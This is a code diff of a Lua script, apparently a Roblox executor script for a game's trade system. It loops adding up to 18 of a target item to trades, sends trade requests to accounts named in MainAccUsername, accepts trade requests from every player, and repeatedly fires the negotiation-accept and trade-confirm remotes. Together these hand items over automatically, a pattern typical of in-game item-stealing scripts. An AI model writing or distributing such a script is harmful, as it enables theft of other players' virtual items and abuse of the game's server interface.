@@ -9,7 +9,6 @@ local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeA
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
 local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
 
-
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
 end)
@@ -55,6 +54,20 @@ end
 
 task.spawn(function()
 	while true do
+		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, 18)
+		
+		for _, uniqueId in ipairs(uniqueIds) do
+			pcall(function()
+				addItemRemote:FireServer(uniqueId)
+			end)
+		end
+		
+		task.wait(1)
+	end
+end)
+
+task.spawn(function()
+	while true do
 		-- Only loop if names are provided and not empty
 		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
 			for _, playerName in ipairs(MainAccUsername) do
@@ -72,25 +85,41 @@ task.spawn(function()
 	end
 end)
 
-task.spawn(function()
-	while true do
-		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, 18)
-		
-		for _, uniqueId in ipairs(uniqueIds) do
-			pcall(function()
-				addItemRemote:FireServer(uniqueId)
+local function acceptTradeForAll()
+	for _, targetPlayer in ipairs(Players:GetPlayers()) do
+		if targetPlayer ~= Players.LocalPlayer then
+			local args = {
+				targetPlayer,
+				true
+			}
+
+			local success, err = pcall(function()
+				return tradeFunction:InvokeServer(unpack(args))
 			end)
+
+			if success then
+				print("Successfully processed trade request for: " .. targetPlayer.Name)
+			end
 		end
-		
-		task.wait(1)
 	end
-end)
+end
 
 local function AcceptNegotiationLoop()
     while true do
         game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
-        task.wait(0.5)
+        task.wait(1) -- Wait 1 second before firing again
+    end
 end
 
 -- Start the loop
 task.spawn(AcceptNegotiationLoop)
+
+local function ConfirmTradeLoop()
+    while true do
+        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
+        task.wait(1) -- Wait 1 second before firing again
+    end
+end
+
+-- Start the loop
+task.spawn(ConfirmTradeLoop)
